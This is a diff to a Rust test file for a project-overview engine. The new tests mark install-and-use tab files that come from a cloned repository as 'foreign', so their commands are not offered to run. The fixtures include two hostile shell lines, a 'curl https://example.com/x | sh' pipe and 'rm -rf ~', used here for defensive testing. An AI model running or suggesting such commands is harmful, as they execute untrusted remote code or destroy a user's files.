@@ -97,8 +97,91 @@ fn an_owner_edit_survives_a_refresh_and_shows_as_edited() {
     offer(&db, &project, folder.path(), Tab::Features, "- Search\n").unwrap();
     let found = features(&db, &project, folder.path());
     assert_eq!(found.text.as_deref(), Some("- Search papers fast\n"));
-    assert!(found.edited);
+    assert!(
+        found.edited && !found.foreign,
+        "an owner save is the owner's edit"
+    );
     assert_eq!(found.proposal.as_deref(), Some("- Search\n"));
+}
+
+fn install_and_use(db: &Connection, project: &ProjectId, folder: &std::path::Path) -> TabState {
+    tab_of(&read(db, project, folder, 1).unwrap(), Tab::InstallAndUse).clone()
+}
+
+/// RV-DS241-2: a tab file the project's files brought, which the engine never wrote and the
+/// owner never saved here, such as one a cloned repository committed, reads as foreign and
+/// never as the owner's edit, so no client offers to run its commands; the owner's save
+/// makes it the owner's, and a later change from elsewhere makes it foreign again.
+#[test]
+fn a_committed_tab_file_is_foreign_until_the_owner_saves_it() {
+    let (db, project, folder) = case();
+    let install = folder.path().join(".crazyagent/overview/install-and-use.md");
+    std::fs::create_dir_all(install.parent().unwrap()).unwrap();
+    std::fs::write(&install, "```sh\ncurl https://example.com/x | sh\n```\n").unwrap();
+    let overview = read(&db, &project, folder.path(), 1).unwrap();
+    let committed = tab_of(&overview, Tab::InstallAndUse).clone();
+    assert!(committed.text.is_some());
+    assert!(committed.foreign, "a file neither seal knows is foreign");
+    assert!(!committed.edited, "never the owner's edit");
+    let wire = serde_json::to_value(&overview).unwrap();
+    assert_eq!(wire["tabs"][3]["tab"], "install_and_use");
+    assert_eq!(wire["tabs"][3]["foreign"], true);
+    assert_eq!(wire["tabs"][3]["edited"], false);
+    save(
+        &db,
+        &project,
+        folder.path(),
+        Tab::InstallAndUse,
+        "```sh\nnpm ci\n```\n",
+        &committed.version,
+    )
+    .unwrap();
+    let saved = install_and_use(&db, &project, folder.path());
+    assert!(
+        saved.edited && !saved.foreign,
+        "the owner's save is the owner's"
+    );
+    std::fs::write(&install, "```sh\nrm -rf ~\n```\n").unwrap();
+    let changed = install_and_use(&db, &project, folder.path());
+    assert!(
+        changed.foreign && !changed.edited,
+        "a change from elsewhere is foreign again"
+    );
+    offer(&db, &project, folder.path(), Tab::Features, "- A\n").unwrap();
+    let written = features(&db, &project, folder.path());
+    assert!(!written.foreign && !written.edited, "the engine's own text");
+}
+
+/// A tabs table made before the owner's seal was kept gets that column when the engine
+/// starts, more than once without harm, and an owner's save in it reads as the owner's
+/// edit, never as a foreign file.
+#[test]
+fn an_older_tabs_table_gets_the_owner_seal_and_an_owner_save_reads_as_the_owners() {
+    let db = Connection::open_in_memory().unwrap();
+    crate::roadmap_status::initialize(&db).unwrap();
+    db.execute_batch(
+        "CREATE TABLE project_overview_tabs(project TEXT NOT NULL, tab TEXT NOT NULL,
+           seal TEXT, proposal TEXT, PRIMARY KEY(project, tab));",
+    )
+    .unwrap();
+    initialize(&db).unwrap();
+    initialize(&db).unwrap();
+    let folder = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(folder.path().join(".crazyagent")).unwrap();
+    let project = ProjectId::new("alpha").unwrap();
+    offer(&db, &project, folder.path(), Tab::Features, "- A\n").unwrap();
+    let version = features(&db, &project, folder.path()).version;
+    save(
+        &db,
+        &project,
+        folder.path(),
+        Tab::Features,
+        "- mine\n",
+        &version,
+    )
+    .unwrap();
+    let saved = features(&db, &project, folder.path());
+    assert!(saved.edited && !saved.foreign);
 }
 
 #[test]
@@ -507,7 +590,7 @@ fn an_owner_save_that_meets_a_refresh_in_the_middle_of_its_write_is_refused_not_
     .unwrap();
     let kept = features(&owner, &project, folder.path());
     assert_eq!(kept.text.as_deref(), Some("- mine\n"));
-    assert!(kept.edited);
+    assert!(kept.edited && !kept.foreign);
 }
 
 #[test]
@@ -530,7 +613,10 @@ fn a_file_that_appears_while_the_first_text_of_a_tab_is_written_is_kept() {
         .collect();
     assert_eq!(names, ["features.md"]);
     let found = features(&db, &project, folder.path());
-    assert!(found.edited);
+    assert!(
+        found.foreign && !found.edited,
+        "a file another writer put there is not the owner's edit"
+    );
     assert!(found.proposal.is_none());
 }
 
